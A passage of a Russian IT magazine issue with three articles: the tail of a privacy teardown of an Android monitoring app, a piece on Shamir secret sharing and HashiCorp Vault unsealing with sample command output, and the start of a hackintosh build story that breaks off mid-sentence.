   ности транспортного уровня  (TLS) для приложений Java на  Android
   и OpenJDK;
 • libface_detector_v2_jni.so —  опенсорсная  биб лиоте ка  libfacedetection
   для распознавания лиц на фото;
 • libtool_checker_jni.so — биб лиотека из сос тава опенсорсного пакета root‐
   beer, предназначенного для проверки наличия прав root на устройстве.
   Чуть подробнее расска жу о ней дальше.

Беглый анализ показал, что, помимо обфусци рованного кода и почти стан‐
дартных OkHttp 3, Retroﬁt 2 и Crashlytics, приложение использует компоненты
com.redmadrobot.inputmask.helper и com.scottyab.rootbeer.
  Первый компонент особого интереса не представляет, он используется
для проверки ввода телефонного номера при регистрации приложения. Root‐
beer же как раз проверяет «рутованность» исполь зуемого устройства: ищет
определенные приложения, бинарный файл su или компоненты BusyBox.
   Все, дальше вроде тянуть уже некуда, надо смотреть код. Я не буду утом‐
лять читателя скрупулезным и занудным описанием алгоритма, тем более что
из‐за обфускации кода пришлось бы час то использовать слова «вероятно»,
«похоже» и «судя по всему», и просто расскажу своими словами.
  При запуске приложение достает из настроек адрес сервера для отправки
данных, интервал для отправки координат и интервал для сбора и отправки
телеметрии (отметим, что эти зна чения можно изменить по команде с сер‐
вера). Затем проверяет наличие необ ходимых для работы раз решений и,
если нужно, запрашивает их, а также выводит запрос на добавление в «белый
список» энергосбережения, что бы ОС не мешала работать в фоновом
режиме.


if(!((activity)this).j()) {
            StringBuilder v1 = k.b.a.a.a.a("package:");
            v1.append(this.getPackageName());
            this.startActivityForResult(new Intent("android.settings.
REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse(v1.toString())), 3);
            return;
        }

Также проверяется (с помощью акселерометра), держит ли пользователь
устройство в руках.
  В приложении есть три основных сервиса:
 • LocationService — периодичес ки собира ет координаты;
 • MessagingService — отслеживает сообщения с сервера, в сообщениях
   могут быть новые настройки или зап рос на фото пользователя;
 • PeriodicJobService — собира ет и отправляет телеметрию.

Приложение периодически (в моем случае раз в пять минут, но это значение
может быть изме нено сервером) получа ет координаты и телеметрию, отправ‐
ляет их на сервер, а также ждет запроса на фото. Если запрос на фото при‐
шел, то выводится уведомление и пода ется звуковой сигнал. Кстати, когда
пользователь делает фотографию, устройство автоматически ищет лицо
в области предпросмотра (см. выше про libface_detector). Пока лицо не будет
найдено, фотографию отпра вить не получится.
  В интернете попада лась информация, что у поль зователя есть один час
с прихода уведомления, чтобы сделать фото. В коде я никаких подтвержде‐
ний этому не нашел. Если отсчет времени ведет ся, то это, надо думать, про‐
исходит на сервере.
  Посмотрим подробнее, какие именно данные при ложе ние отправляет
на сервер.





Класс Location, как оказалось, содержит не толь ко координаты (а именно дол‐
готу, широту, высоту, скорость, точность, азимут), но и кучу интересной
информации: версию ОС, уровень заряда батареи, заряжается ли устройство
в настоящий момент, дату и время, номер телефона, модель телефона, дату
и время установ ки программы, наз вание провайдера, находится ли телефон
в руках в момент сбо ра данных, количес тво прой денных шагов.


             INFO

                       Геолокация в телефоне сама по себе — это край‐
                      не  ненадежный  способ  отсле живания.  Если
                       перек лючить телефон в режим разработчика, то
                        в появившихся настройках будет пункт «Выб рать
                      приложение  для фик тивных местоположений».
                        Есть масса  бесплатных приложе ний,  которые
                      при зап росе будут выдавать ложные координаты,
                      и ОС передаст их приложениям вместо реальных.


Помимо этого, приложение собирает информа цию об окру жающих телефон
сетях Wi‐Fi и подклю ченных по Bluetooth устройствах.


public final class IndoorNavigation {
    public final Set bluetoothDevices;
    public final Set wifiDevices;


    public IndoorNavigation(Set arg2, Set arg3) {
        if(arg2 != null) {
            if(arg3 != null) {
                super();
                this.bluetoothDevices = arg2;
                this.wifiDevices = arg3;
                return;
            }
            j.a("wifiDevices");
            throw null;
        }
        j.a("bluetoothDevices");
        throw null;
    }

Также программа ведет  лог, в который пишет собранную информацию
и ошибки, но посмотреть содержимое лога без рута не получается. Наде юсь,
когда надобность в программе у меня отпадет, я рутану телефон и смогу изу‐
чить лог.
  За неделю использования приложение отправило 8,54 Мбайт трафика,
из них в активном режиме 6,34 Мбайт, в фоновом 2,2 Мбайт.


ВЫВОДЫ
Честно говоря, по итогам исследования я нес колько разочарован. Была
надежда найти какие‐нибудь шокирующие факты и грубые попирания приват‐
ности, но вынужден признать, что в целом функции соответствуют заяв‐
ленным. Конечно, отправляется не только геолокация и фото, но и много дру‐
гих данных сверх описанных (шагомер, Bluetooth, Wi‐Fi и прочее), но это явно
сбор косвенных улик, а не что‐то пос тороннее. Впрочем, было бы неплохо
уведомлять пользователя о собираемых данных и не умалчивать эти под‐
робности.
  На этом все. Будьте здоровы!
 ПРИВАТНОСТЬ





meklon (Иван Гуменюк)
   meklon@gmail.com


 ПРОБЛЕМЫ
  ДОВЕРИЯ

         КАК РАЗДЕЛИТЬ КЛЮЧ МЕЖДУ ЛЮДЬМИ
          И ЗАСТРАХОВАТЬСЯ ОТ ЕГО ПОТЕРИ




 Хорошо  быть  парано иком.  Весело. Быстро  приходишь
 к идее, что доверять никому нельзя, да и себя тоже на всякий
 случай лучше держать под подозрением. Совсем радостно
 становится, когда с таким мировоззрением устраиваешься
 в крупную компанию и начина ешь проектировать ключевые
 с точки зрения ИБ сервисы. Поэто му предлагаю обсудить,
 как обес печить сохранность ценных секретов в окружении,
 где все — потенциальные зло умыш ленники.


 СЕКРЕТЫ БЫВАЮТ РАЗНЫМИ
 Пароли,  API‐ключи,  сертифика ты  и  дру гие  секреты  неравнозначны.
 Для любой компании риск несанкциони рованного доступа можно выразить
 в прямых и косвенных убытках. Если сумму убыт ков от утечки секрета умно‐
 жить на вероятность атаки, то можно разбить наши пароли на несколько
  категорий:
  • Никому не нужные. Поднял виртуальную машину, что‐то потестировал
    и забыл. Мак симум, что можно ута щить, — рас писание полива растений
    в офисе из скрипта одно го админа.
  • Потенциально значимые. Тестовая БД, какой‐то второстепенный сервер
    или что‐то подобное. Несанкционированный дос туп сам по себе не при‐
    несет убытков, но может быть «трамплином» для более глу бокого проник‐
    новения в инфраструктуру компании.
  • Значимые. Боевая БД, важный сервер логов и дру гие ключевые системы.
    Если злоумышленник проникнет сюда, то сможет либо выкрасть ценную
    информацию, либо зна чительно нарушить работу компании.
  • Офигенно критичные. Что может быть более неприятным, чем скомпро‐
    метировать важный пароль? Правиль но — продолбать всю связку паролей
    целиком. Например, базу Keepass вмес те с ключом для дос тупа. Если зло‐
   умышленник до нее доберется, то финансовый ущерб компании может
    быть невосполнимым.

 Мы поговорим о последней категории, которую нужно защищать не только
  от атак извне, но и от внутренних угроз.


 У ВСЕХ ЕСТЬ СВОЯ ЦЕНА
 К сожалению, не все люди честные и пра вильные. Видел новости про утекшие
 базы данных, которые сливали сотрудни ки? А это, между прочим, впол не
 себе статья УК. Давай заглянем в голову к таким сотрудникам.
    Человек    из    регионального    отделения    получает    зарплату
 в условные 35 тысяч рублей. Ему предос тавили дос туп к важной базе, чтобы
 он мог выполнять свои рабочие задачи. Совершенно внезапно к нему из глу‐
 бин даркне та приходит заманчивое предложение слить всю базу за 500 тысяч
 рублей. Сотрудник смотрит в свою зарплатную ведомость, оце нивает свои
 шансы быть пойманным и идет на этот риск.
   Покупатель из даркнета тоже соотносит расходы на подкуп сотрудни ка
 и итоговую выгоду от полученной информации. Если выгода больше рис‐
 ков — он будет рисковать.
    Отсюда довольно простой вывод: иде альной защиты не существу ет.
 Основная задача в том, чтобы сделать атаку невыгод ной, когда подкуп сот‐
 рудников и другие мероприятия потребуют боль ших затрат, чем прибыль
  от похищенных данных.
   Соответственно, нужно сделать так, чтобы ни один сотрудник не мог еди‐
 нолично получить доступ к особо важным системам вроде централизованных
 хранилищ паролей. Давай гля нем, как это реализуется в жизни, а потом вер‐
 немся к нашим цифровым радос тям.


 КРАСНАЯ КНОПКА ДЛЯ ГЕНЕРАЛА
 Есть вполне реальные ситуации, когда необходимо разделить ответствен‐
 ность между несколь кими ключевыми людь ми. Возь мем что‐нибудь веселое
 вроде запуска ядерных ракет. Допус тим, что условный подземный бункер,
  когда связь с главным шта бом пропала, может самос тоятельно решить
 нанести ответный удар.
    Вполне разум ным вариантом будет выдать ключи для запуска нескольким
 людям. Например, дежурному офицеру и началь нику секретной базы с МБР.
 Таким образом, внезап но сошедший с ума офицер не сможет устроить
 третью мировую вой ну, приняв решение единолично. Мы снижаем веро‐
  ятность несанкционированного доступа, разделяя секрет между ключевыми
 людьми.
    Аналогичным образом пос тупа ют, когда требуется организовать доступ
 в особо охраняемое банковское хранилище. Раз решение открыть двери дол‐
 жны одновременно подтвердить несколько ответственных лиц. Стоимость
  атаки на хранилище сразу рез ко возрастает, так как необходимо подкупить
 или обокрасть уже минимум двух людей, имеющих дос туп.


 ОПТИМАЛЬНАЯ ЗАЩИТА
 Хочу сразу заметить, что очень сложно найти хороший баланс между удобс‐
 твом шифрования секретной информации и надеж ностью. Любой вариант
 «резервных кодов дос тупа» на случай, если основные будут утрачены,
 ослабляет защиту и добавляет дополнительные векторы атаки. Если мы пыта‐
 емся разделить секрет на несколько ответс твенных, то все становится
 еще сложнее.


 Сейф и бумаж ки
 Допустим, мы защищаем условный суперпри вилегированный секрет, который
 может использоваться только в исключительных случаях. Например, мобиль‐
 ные телефоны, имеющие дос туп к корпоративной почте и ресурсам, управля‐
 ются с помощью системы MDM (Mobile device management). Мы не хотим,
  чтобы кто‐то один из подразделения ИБ мог получить дос туп к данным
 с телефона сотрудника. При этом нам нужно иметь возможность дистанци‐
 онно уничтожить содержимое телефо на или узнать его текущие координаты
 GPS, если устройство укра дут. Соответственно, нам нужно решение, которое
 позволит разделить ответс твенность между несколькими людьми.
   Мы можем напечатать пароль на листочке, положить в конверт, залить сур‐
 гучом и торжественно положить в сейф. Уже неплохо. Вскры вать и опечаты‐
  вать будем только в присутс твии комиссии. Но лис точек сложно бэкапить, он
 хранит секрет в открытой форме, что увеличивает риски его компрометации.
 А еще это физический объект — если кто‐то из обязательных членов комис‐
 сии находится в командировке, экстренный доступ ста новится проблемным.


 Матрешка с паролями
 К черту бумажки и картонные папочки. Будем современными. Давай пойдем
 самым простым путем и сделаем архив 7‐Zip, зашифрованный криптостойким
 AES‐256. Мы не хотим, чтобы один сотрудник мог еди нолично получить дос‐
  туп к секрету, поэтому мы будем конс труировать матрешку из вложенных
 архивов, где каждый слой закрывает сво им паролем новый человек. Нап‐
 ример, руководитель ИБ и технический директор.
    На первый взгляд, все работает отлично. Надежность защиты от компро‐
 метации быстро растет пропорционально числу людей. Например, если
 вероятность утечки пароля от одного человека — 0,05, то для шес ти человек
          6             –8 уже 0,05 = 1,5625 × 10    .





                        Считаем по фор муле

 Круто. Но есть проб лема. Вероятность необратимо утратить защищаемый
 секрет точно так же нарас тает. C человеком нередко случается какая‐нибудь
 фигня. Шагнет, например, неудачно под авто бус на красный свет, или скле‐
 роз нападет. Если это централизованное хранилище особо ценных для ком‐
 пании данных, их утрата может быть фатальной.


 РАЗБИВАЕМ НА ФРАГМЕНТЫ
 На самом деле есть хорошее решение.
    Существует очень изящная реализация разделения секрета на несколько
 частей — схема Шамира. Да, это тот самый Ади Шамир, который S в аббре‐
  виатуре RSA. При исполь зовании это го метода исходный пароль разбивается
 на k равнозначных частей. Особен ность схемы в том, что для восстановления
 секрета требуется лишь определенная часть фрагментов. Например, любые
 четыре из шести. При этом если тебе известны три час ти из шес ти, то
 это никак не поможет восстановить изначальный пароль.
    Размер одного фрагмента при этом равен исходному секрету, поэтому,
  как и в криптографии с открытым ключом, обычно нет смысла дробить на час‐
  ти большой объем данных. Гораз до проще нарезать ломтиками ключ от быс‐
 трого симметричного алго ритма шиф рования и уже им зашифровать весь
 объем данных. Этот метод хорошо мас штабируется. Можно добавлять новых
 людей, которые хранят час ти общего ключа. При этом размеры кворума
 не изменятся. То есть если рань ше надо было соб рать три ключа из пяти, то
 теперь достаточно трех из вось ми.
    А еще есть возможность ротации фрагментов ключей. Алгоритм под‐
 разумевает схе му, при которой дос таточное чис ло людей собираются
 и генерируют новый набор. Зашифрованный общий ключ остается неиз‐
 менным. Это очень ценное свойство на случай компрометации, увольнения
 сотрудника или других проб лем.
   Самое главное, что он подразумевает большую гибкость при раздаче час‐
 тей ключа. Например, генеральному директору мож но выдать три фрагмента,
 а всем остальным по одному. Таким образом мож но учитывать степень важ‐
 ности и благонадежности каждого ответс твенного челове ка в компании.


 DRP НА ЛЮДЕЙ
 DRP (Disaster Recovery Plan) — это такая важная шту ка, которая в идеале
 никогда не должна пригодиться. Но уж если случается фигня, то ты с умным
 видом открываешь ящик, лис таешь пап ки с надписями «Падение продук‐
 тивной БД», «Пожар в дата‐центре», «Утечка Т‐вируса» и, наконец, берешь
 «Внезапный день рождения руково дителя». Пос ле этого просто сле дуешь
 заранее разработанной инс трукции. И в прин ципе, совершенно неважно, что
 именно произошло, но у тебя уже есть заранее спрогнозированные карты
 ущерба, планы аварийной миграции кластера на дру гую площад ку и тому
 подобное.
    Разработка хорошего DRP — идеальная работа для настояще го парано‐
  ика. Но, к сожалению, многие забыва ют, что, помимо железа, есть еще одна
  точка отказа — это люди. Их тоже необ ходимо резервировать, чтобы обес‐
 печить отказоустой чивость бизнес‐систем. Например, еда для пилотов граж‐
 данской ави ации готовится всег да на раз ных кухнях и состоит из разного
 набора продуктов. Никто не хочет, чтобы син хронный приступ острой диареи
 помешал нормальному управлению самолетом.
    Когда разрабатываешь хит рую систему с ключами, шифрами, закрытыми
 базами и всем прочим, всегда думай, как будешь это потом откры вать в ава‐
 рийной ситуации. Например, ты выбрал разделение секрета по схе ме
 Шамира и выдал шесть клю чей, из которых нуж но ввести любые четыре. Вро‐
 де все нормально.
    А теперь представь себе тот самый «фактор авто буса». Во время очеред‐
 ного корпоратива трое из хранителей внезап но выбывают навсегда. Неваж‐
  но, лодка опрокинулась или кто‐то неудачно пожарил только что собранные
 грибы. Теперь у тебя на руках есть три ключа и потерянная навсегда база
 с криптостойким шифром.
    Что с этим делать? Хра нители должны быть географически рас пределе ны
 и не встречаться одновременно в одной точке. Это не так сложно реали‐
  зовать, если у тебя крупная компания с множес твом филиалов. Часть хра‐
 нителей может быть в «холодном резерве» и не использоваться в обычных
 процессах. Да, тут работают все те же принципы георас пределенности
 и резервирования, что и при построении классических отказоустойчивых
 архитектур.
    Также  предусмотри  традиционную  схему  с  опечатанным  сейфом
 под камерами, где в кра сивом крас ном конверте будут храниться резервные
 клю чи Судного дня, формирующие кво рум. Естественно, такой сейф откры‐
 вается только в присутствии комиссии, когда речь идет о критической угрозе
 бизнес‐процессам.


 HASHICORP VAULT
 Давай перейдем к более практическим при мерам. Есть такой замечательный
 продукт — Vault компании Hashicorp. Это когда ты вместо того, чтобы раскле‐
 ивать админские пароли на бумажках и хардкодить их прямо в скриптах, соз‐
 даешь централизованное виртуальное хранилище, обнесенное колючей про‐
 волокой и горящими кро кодилами. Все доступы распре делены, каждый зап‐
 рос через API логируется, и все это отлично интегри руется с процессами CI‐
 CD и автоматизированными системами.
    Архитектурно у тебя есть сама база данных, которая хранится зашиф‐
 рованной на бэкенде в виде отказоус тойчивого клас тера Consul. Про Consul
 подробно рассказывать не буду, лишь упомяну, что он работает на базе край‐
 не устойчивого протокола Raft.
   Самое инте ресное в дру гом: если у нас БД хра нится в зашифрованном
  виде, то нодам Vault, что бы предос тавлять дос туп к паролям, нужно хранить
  у себя мастер‐ключ для дос тупа к базе. Это проблема, так как они сразу же
  станут первооче редным объектом для ата ки. Малейшая уязвимость ноды,
 копия виртуальной машины недобросовестным админом, и мастер‐ключ утек.
 Вместе со всеми секретами компании.





 И вот тут появляется интересная особен ность Vault. Он не хранит пароль ниг‐
 де на жестком диске, своп отклю чен, и появление мастер‐ключа где‐то,
 помимо оперативной памяти, исключено. Пос ле перезагрузки нода понятия
 не имеет, как открыть зашифрованную базу, и требует поочеред ного ввода
 фрагментов Шамира кворумом хранителей. Реализуется это либо через кон‐
 соль SSH, либо через веб‐интерфейс, что очень упрощает разблокировку
 ноды в случае распределенной команды.
    Что получается в результате? Из фрагментов Шамира собирается мас‐
  тер‐ключ, им расшифровывается уже ключ, которым зашифрована база дан‐
  ных. Двухступенчатость нужна для того, чтобы иметь возможность регулярно
 ротировать фрагменты Шамира и изменять их чис ло без необходимости
 перешифровывать всю базу. Если пос мотреть на про цесс абс трактно, то мы
 формируем пароль, используя кворум неизвлекаемых хранилищ — содер‐
 жимого памяти нескольких людей. В результате формиру ется такой же неиз‐
 влекаемый в большинстве случаев мас тер‐ключ, хранящийся в RAM.


 ПРОБЛЕМА ПЕРВИЧНОЙ РАЗДАЧИ
 Самая сложная часть в процеду ре первичной выдачи ключей.
   1. Ты должен обеспечить  возможность  удаленной выдачи фрагментов
    Шамира.
   2. Не должно быть человека, который нажмет что‐то в консоли, получит все
    фрагменты и разошлет всем остальным.



   $ vault operator init


   Unseal Key 1: 4jYbl2CBIv6SpkKj6Hos9iD32k5RfGkLzlosrrq/JgOm
   Unseal Key 2: B05G1DRtfYckFV5BbdBvXq0wkK5HFqB9g2jcDmNfTQiS
   Unseal Key 3: Arig0N9rN9ezkTRo7qTB7gsIZDaonOcc53EHo83F5chA
   Unseal Key 4: 0cZE0C/gEk3YHaKjIWxhyyfs8REhqkRW/CSXTnmTilv+
   Unseal Key 5: fYhZOseRgzxmJCmIqUdxEm9C3jB5Q27AowER9w4FC2Ck


 Есть возможность инициализировать его из консоли единолично, как в при‐
 мере выше. Потом админа можно смело сталкивать с утеса. Но есть и более
 гуманные механизмы. Каждый из хра нителей предоставляет открытую часть
 своего GPG‐ключа админу Vault. Пос ле чего происходит инициализация:



   $ vault operator init ‐key‐shares=3 ‐key‐threshold=2
   ‐pgp‐keys="jeff.asc,vishal.asc,seth.asc"


   Key 1: wcBMA37rwGt6FS1VAQgAk1q8XQh6yc...
   Key 2: wcBMA0wwnMXgRzYYAQgAavqbTCxZGD...
   Key 3: wcFMA2DjqDb4YhTAARAAeTFyYxPmUd...
   ...


 Расшифровать каждый фрагмент Шамира сможет только обладатель зак‐
 рытой части GPG. Мы успешно распределили секрет, ни разу не собрав его
 в одном месте в открытом виде.


 ВЫВОДЫ
   1. Проектируй любую систему со здравой порцией паранойи.
   2. Никогда не забывай, что мало все тща тельно зашифровать. Важно суметь
    расшифровать это все обратно.
   3. Если при потере ключей остановится бизнес, будь вдвойне внимателен.
   4. Оставляй бэкдор в виде бумаги в сейфе.
   5. Лю ди — тоже часть механизма, и их нужно резервировать. Резервируй.

 И никому не доверяй.
ТРЮКИ

ИСТОРИЯ ОДНОГО
ХАКИНТОША
КАК Я СОБРАЛ
ДЕШЕВЫЙ КОМПЬЮТЕР
НА MACOS
ИЗ ВЕТОК
И КОМПОСТА





  Валентин Холмогоров
    valentin@holmogorov.ru





Чаще всего люди планируют собрать хакин тош с какой‐то
определенной целью: освоить новую для себя операци‐
онную сис тему или делать что‐то, для чего нужен имен но
мак. Выбирают аппаратную кон фигурацию, покупают железо
и в пос леднюю очередь размышляют о том, куда это железо
поместить. У меня вышло прямо наобо рот: волею случая мне
достался великолеп ный корпус от Power Mac G5, для которо‐
го я не нашел лучшего применения, кро ме как собрать в нем
хакинтош на платформе Intel.


Этому Power Mac G5 выпала непростая судь ба. Много лет он тру дился верой
и правдой у моего приятеля, пока однажды на компьютере не вышла из строя
материнка. Приятель заказал ана логичную пла ту на eBay, но где‐то между
Лос‐Анже лесом и Таганрогом «Почта Рос сии» уронила на нее бандероль
со слоном, в результате чего и эта плата окончательно пришла в негодность.
Отчаявшись, владелец решил сдать без временно почивший Power Mac
в цветмет, но я вовремя отговорил его от этой затеи и обменял бездыханную
компьютерную тушку на пару бутылок «Шпа тена». С тех пор G5 пылился
на моих антресолях, дожидаясь момента, когда у меня наконец дойдут руки
сделать из него хоть что‐то полезное. Сво бодное время появилось с нас‐
туплением коронавирусного апокалипсиса, и я не стал терять его даром.
  С самого начала я решил не восста навливать компьютер в аутентичной
конфигурации: платформа Power PC, хоть у нее и остаются преданные
фанаты, сегодня уже морально устарела. Под ста рую OS X нет современного
софта, браузеры неспособны адекватно отоб ражать веб‐страницы, да и
работает эта операционка, прямо ска жем, небыс тро. Однако с переходом
Apple на платформу Intel появилась возможность запус кать macOS не только
на настоящей «яблочной» технике, но и на обычных ПК, имеющих совмести‐
мые аппаратные характеристики. Да, в отличие от настоящих маков, в хакин‐
тошах далеко не все работа ет «из коробки», и с настройкой операционной
системы порой приходится изрядно повозиться. Но, как говорила Красная
Шапочка из популярного анекдота, «дорогу знаю, секс люблю». Труд ности
меня не пугали.





    Этот великолепный стиль ный корпус достался мне на халяву! Ну, почти

Утвердившись в мысли соб рать хакин тош, я поставил себе еще одну задачу:
потратить на запланиро ванный научно‐техничес кий экспе римент как можно
меньше финансов. Элегантный корпус, похожий на стильную алюмини евую
терку, у меня уже был. От старых апгрейдов и компь ютерных ремонтов оста‐
лась пара модулей памяти DDR3, видеокарта AMD Radeon HD 5800, неплохой
блок питания на 450 Вт и даже ноутбучный SSD‐накопитель на 120 Гбайт.
Не хватало самого главного: процессора и материнской платы. На всякий
случай отмечу, что до начала этой эпопеи я никогда не занимал ся ничем
подобным — это был мой первый опыт самос тоятельной сборки хакинтоша,
и я совершенно не представлял, с чем имен но мне придется столкнуться.
   Прошерстив форумы и покурив ману алы, я узнал, что к выбору комплек‐
тующих следует подходить не так, как это делал я, а осоз нанно. Энту зиасты
публикуют специальные таблицы совместимос ти, позволя ющие опре делить,
на каком железе можно запустить macOS без проб лем, какое будет работать
лишь под звуки бубна, а с каким лучше не связывать ся вовсе. По счастью, моя
видеокарта оказалась в списке поддерживаемых устрой ств. Среди материн‐
ских плат наилучшей совместимостью обладают многие изделия Gigabyte
и некоторые модели ASUS, но большинство из них никак не вписывается
в категорию бюджетных. На одном из форумов я наткнулся на упоминание
о том, что китайцы давно и продуктивно торгуют на AliExpress недорогими
материнскими платами под процес соры  Intel Xeon, отлично годящимися
для сборки хакинтошей.


        WWW

                       Актуальную  информацию  по  совместимому
                        с macOS железу ты можешь найти на следующих
                       сайтах:
                      •Тonymacx86 — один из известнейших англо‐
                         язычных ресурсов, посвящен ных хакинтошам.
                        •Hackintosh.com  —  название  говорит  само
                          за себя. Тут можно отыскать полезные инструк‐
                       ции и гайды.
                        •OSX86Project — один из старейших хакерских
                        проектов,  посвященных   установке  macOS
                         на PC. Русскоязычный форум, похоже, дав но
                          умер, но англоязычный живее всех живых.
                      •Ветка  на  4PDA,  посвященная  хакинтошам.
                     Форум  4PDA  вообще   кладезь  полезной
                      информации на русском языке по этой теме.
                      •Раздел про хакинтош на Android+1 —  тут я
                       нашел несколько полезных мануалов по заводу
                         девайсов.
                             •Applelife.ru — прек расный форум, на котором
                     можно найти инструк ции по заводу видеокарт,
                           звука и прочих девайсов на хакинтошах.
                  •Ну и конечно, ролики с видеоинструкциями
                         на YouTube.


Я   остановил   свой   выбор   на   китайской   плате   g218a    rev
1.2 под сокет 2011 с установленным на ней 6‐ядерным процессором Intel
Xeon E5‐2620, которую по случаю купил на «Авито» за пару тысяч рублей.
Помимо низкой цены, пла та интерес на тем, что на ней имеется аж четыре
слота DDR3, в которые можно устанавливать серверную память с поддержкой
ECC REG. Эта память, как ни странно, продает ся намного дешевле обычной
«десктопной» (а в варианте «б/у» — вооб ще почти даром), притом что сама
плата поддерживает четырехканальный режим. На «Али» сейчас таких плат,
пожалуй, уже не сыскать, но есть современные и очень недорогие аналоги
вроде Jingsha x79, а также раз личные платы под торговой маркой Huanan.
Да и вообще, с сокетом 2011 на AliExpress можно най ти множество OEM‐плат
известной китайской фирмы NoNaMe, главное — загуглить, подойдет ли чип‐
сет для конструирования хакинтоша.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

    ИСТОРИЯ ОДНОГО
         ХАКИНТОША
                КАК Я СОБРАЛ ДЕШЕВЫЙ КОМПЬЮТЕР
                 НА MACOS ИЗ ВЕТОК И КОМПОСТА





ХАРДВАРЬ
Первым этапом в деле строительства хакин тоша стал варварский демонтаж
потрохов Apple Power Mac из фирменного корпуса. Дефектная материнская
плата отправилась на помойку, за ней последовал блок питания, который
в этой машине очень компактно рас положен в нижней час ти кейса. Оба про‐
цессора, система охлаждения, видяха и прочий исправный ливер были выс‐
тавлены за копейки на дос ке объявлений и со свис том улетели к новым вла‐
дельцам  буквально на следующий  день. Огромная  куча вентиляторов,
которыми был оборудован G5, заполнила отдель ный мусорный пакет.





          Зачем в компьютерах Apple столько вентиляторов?

Наконец корпус был освобожден от лиш них конструктивных элементов.





                 Так Power Mac выглядит гораз до лучше!

Поскольку точки монтирования современных материнских плат расположены
иначе, чем на плате с процессорами Power PC, да и размещение эле ментов
на задней стенке системного блока прин ципиально иное, я решил не замора‐
чиваться с художественным выпиливани ем по металлу, а пойти по пути
наименьшего сопротивления. В соцсетях был найден старый компьютерный
корпус формата MiniTower, от которого я открутил и вернул владельцу блок
питания, благодаря чему ящик дос тался мне «за самовы воз». То, что кор‐
пус — старый, было мне только на руку: в давние времена производители
не жалели металла для компь ютерных кей сов, бла годаря чему они были креп‐
кими, в отличие от современных, сделанных из паршивой фольги.
  Мне от корпуса был нужен только поддон, к которому кре пится плата,
и задняя стенка с отверстием под планку материнки и пазами для плат рас‐
ширения — этот кусок я благополучно выпилил дремелем. Примерив поддон
в корпусе G5, я разметил на задней стенке соот ветс твующие отверстия, пос‐
ле чего тем же дремелем варварски уда лил все лишнее. После установки
новой платы я закрыл оставшиеся отверстия вырезанной из алюмини евого
листа пластиной, которую закрепил на заклепках, а к стыкам приклеил
декоративный алюминиевый же уголок из строитель ного магазина.





                Безжалостно отпиливаем все лиш нее!

Для крепления поддона в корпусе я использовал мебельные угол ки из бли‐
жайшего строймаркета, а швы в местах стыковки вкладки с корпусом залил
силиконовым герметиком — и для надеж ности, и чтобы избежать дребезга
при вибрации поддона под воздействием работающих кулеров.





  Поддон я закрепил на металличес ких уголках и для надежности залил
  швы герметиком

Отдельно пришлось повозиться с оптичес ким приводом. В качес тве мультид‐
райва в G5 исполь зовался обычный CD‐ROM с интерфейсом IDE, который
отсутствует на современной материнской плате. Найденный мною в коробке
с  компьютерным  хламом  пишущий DVD  с  разъемом  SATA  подошел
по посадочным местам прос то идеально, только вот торцевая пластина лотка
не пролезала в створку на корпусе. Сно ва воору жившись дре мелем с шли‐
фовальной насадкой, я немного модифи цировал лоток, спилив с каждой его
стороны миллиметра по три и знатно надышавшись плас тиковой пылью.
  Следом возник вопрос, как поместить в корпусе блок питания. Стало
совершенно очевидно, что там, где он обычно крепится в корпусах PC, его
приспособить не получится, пос кольку матушкой‐при родой для него не пре‐
дусмотрено посадоч ного места — в верхней задней части корпуса G5 устро‐
ен отсек для жестких дисков, а ниже расположилась материнская плата.
Поразмыслив, я присобачил БП в самом низу ближе к лицевой панели, зак‐
репив его на нижней части корпуса с помощью все тех же мебельных угол ков.
На задней стенке я смонтировал штатный разъ ем для силового кабеля,
который присутствовал в корпусе изначально, причем на том же самом мес‐
те, и припаял к нему провода обрезанного шнура от компьютера. Мес та пай‐
ки я заизолировал термоуса дочными трубками, а оставшийся разъ ем шнура
воткнул в новый БП внутри корпуса. Получи лось довольно‐таки элегантно.





  Мебельные угол ки — лучший помощник строителя коммуниз ма хакин‐
  тоша





  Блок питания пришлось поместить в нижней части корпуса — больше его
  впихнуть было некуда

После всех этих манипу ляций у меня еще оста лась пригоршня мебельных
уголков. Чтобы доб ро не пропада ло, я использовал их для установки в сво‐
бодной верхней части корпуса дополнительного кулера, найденного в короб‐
ке с компьютерным барахлом, которое и к делу не приспособить, и выкинуть
жал ко.





             Лишний кулер в хозяйстве не помешает!

Напоследок нужно было решить, как поступить с лицевой панелью. У Power
Mac в передней части корпуса рас положена кнопка питания, разъемы USB
и IEEE 1394, а также разъ ем для подключения науш ников, причем изнутри все
эти девайсы смонтирова ны на одной плате, имеющей шлейф с диковинным
контактным узлом. Что бы не тратить время на поиск распиновки этого шлей‐
фа в интерне те и не кол хозить переходник, плату я решил выкинуть.
   Кнопку питания подходящего дизайна я без особого труда отыскал
на «Алиэкспрессе» — к ней я припаял про вода с клеммами от старого кор‐
пуса ATX, послужив шего донором для поддона. Отверстие под кнопку в кор‐
пусе Apple пришлось немного рас ширить надфилем.





         Подходящие детали всегда можно найти на AliExpress

Там же, на AliExpress, я заказал девайс, состоящий из двух разъ емов USB
с креплением к лицевой панели компьютер ного корпуса и шнура для подклю‐
чения к материнской плате.





  Высокая скорость двойной порт USB горячее надувательство адаптер
  заголовка PCB отличный качес тва из Китай :)

Поскольку на «мор дочке» Power Mac име ется  только одно отверстие
под USB, второй свободный разъем я закрепил на двусторонний скотч внутри
корпуса и воткнул туда донгл Wi‐Fi. Это ока залось не лучшей идеей: пос ле
закрытия крышки качество приема сигнала бес проводной сети заметно упа‐
ло, и донгл я в итоге подключил к разъему USB на задней панели материн‐
ской платы, где он благополучно работает до сих пор. Вмес то него к внут‐
реннему разъему я присоединил «USB‐свисток» Bluetooth, для которого кор‐
пус оказался не помехой. Примеча тельно: если с запус ком Wi‐Fi пришлось
немного повозиться, о чем я рас ска жу поз же, оба имевшихся в моих богатых
запасах USB‐адаптера Bluetooth (я подключил их ради эксперимента по оче‐
реди) завелись в macOS сра зу и без проблем.





  Свободный внутренний USB‐разъем было решено использовать
  для подключения Bluetooth

Для достижения идеального результата я пла нировал рас паять разъ ем
для наушников и подключить его к порту AUDIO на материнской плате, но мне
стало лень. Вместо это го я воткнул в дыр ку от «джека» на лицевой панели
корпуса светодиод, припаял к нему два провода и присоединил их к кон‐
тактам HDD LED на пла те. Для дырки от IEEE 1394 я распечатал на домаш‐
нем 3D‐принтере заглушку из полупрозрачного пластика Watson и, чтобы она
несла хоть какую‐то функциональную наг рузку, приклеил к ней термоклеевым
пистолетом изнутри еще один светоди од, который завел на Power LED. Выш‐
